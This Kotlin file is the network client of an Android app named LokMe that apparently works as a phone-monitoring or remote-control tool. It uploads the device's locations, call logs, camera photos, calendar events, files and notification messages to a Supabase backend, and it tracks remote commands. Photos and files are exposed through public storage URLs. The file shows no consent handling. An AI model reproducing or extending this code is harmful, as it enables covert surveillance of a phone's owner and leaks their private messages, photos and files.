package com.lokme.network

import android.content.Context
import android.provider.Settings
import com.lokme.LokMeApp
import io.github.jan.supabase.SupabaseClient as SbClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.from
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.storage.Storage
import io.github.jan.supabase.storage.storage
import io.github.jan.supabase.storage.upload
import io.ktor.http.ContentType
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

object SupabaseClient {

    private var client: SbClient? = null

    fun getClient(): SbClient {
        if (client == null) {
            client = createSupabaseClient(
                supabaseUrl = LokMeApp.SUPABASE_URL,
                supabaseKey = LokMeApp.SUPABASE_KEY
            ) {
                install(Postgrest)
                install(Realtime)
                install(Storage)
            }
        }
        return client!!
    }

    fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"
    }

    suspend fun registerDevice(
        context: Context,
        deviceName: String,
        deviceModel: String,
        androidVersion: String
    ) {
        val deviceId = getDeviceId(context)
        val body = buildJsonObject {
            put("id", deviceId)
            put("device_name", deviceName)
            put("device_model", deviceModel)
            put("android_version", androidVersion)
            put("is_online", true)
        }
        getClient().from("devices").upsert(body)
    }

    suspend fun updateDeviceOnline(context: Context, online: Boolean) {
        val deviceId = getDeviceId(context)
        val body = buildJsonObject {
            put("is_online", online)
        }
        getClient().from("devices").update(body) {
            filter { eq("id", deviceId) }
        }
    }

    suspend fun insertLocation(deviceId: String, lat: Double, lng: Double) {
        val body = buildJsonObject {
            put("device_id", deviceId)
            put("latitude", lat)
            put("longitude", lng)
        }
        getClient().from("locations").insert(body)
    }

    suspend fun insertCallLogs(entries: List<com.lokme.model.CallLogEntry>) {
        if (entries.isEmpty()) return
        getClient().from("call_logs").insert(entries)
    }

    suspend fun uploadPhoto(deviceId: String, fileName: String, data: ByteArray): String {
        val bucket = getClient().storage.from("photos")
        val path = "$deviceId/$fileName"
        bucket.upload(path, data) {
            contentType = ContentType.Image.JPEG
        }
        return "${LokMeApp.SUPABASE_URL}/storage/v1/object/public/photos/$path"
    }

    suspend fun insertPhotoRecord(deviceId: String, url: String, cameraType: String) {
        val body = buildJsonObject {
            put("device_id", deviceId)
            put("storage_url", url)
            put("camera_type", cameraType)
        }
        getClient().from("photos").insert(body)
    }

    suspend fun updateCommandStatus(commandId: String, status: String) {
        val body = buildJsonObject {
            put("status", status)
        }
        getClient().from("commands").update(body) {
            filter { eq("id", commandId) }
        }
    }

    suspend fun insertBatteryStatus(deviceId: String, level: Int, isCharging: Boolean, technology: String, temperature: Float, voltage: Int, health: String) {
        val body = buildJsonObject {
            put("device_id", deviceId)
            put("level", level)
            put("is_charging", isCharging)
            put("technology", technology)
            put("temperature", temperature)
            put("voltage", voltage)
            put("health", health)
        }
        getClient().from("battery_status").insert(body)
    }

    suspend fun insertCalendarEvents(deviceId: String, events: List<com.lokme.model.CalendarEvent>) {
        if (events.isEmpty()) return
        getClient().from("calendar_events").insert(events)
    }

    suspend fun insertDeviceFiles(deviceId: String, files: List<com.lokme.model.DeviceFileEntry>) {
        if (files.isEmpty()) return
        getClient().from("device_files").upsert(files) { onConflict = "id" }
    }

    suspend fun uploadDeviceFile(deviceId: String, fileName: String, data: ByteArray): String {
        val bucket = getClient().storage.from("device_files")
        val path = "$deviceId/$fileName"
        bucket.upload(path, data)
        return "${LokMeApp.SUPABASE_URL}/storage/v1/object/public/device_files/$path"
    }

    suspend fun insertNotification(
        context: Context,
        deviceId: String,
        packageName: String,
        appName: String,
        sender: String,
        message: String,
        timestamp: Long
    ) {
        val body = buildJsonObject {
            put("device_id", deviceId)
            put("app_package", packageName)
            put("app_name", appName)
            put("sender", sender)
            put("message", message)
            put("timestamp", timestamp)
        }
        getClient().from("notifications").insert(body)
    }
}
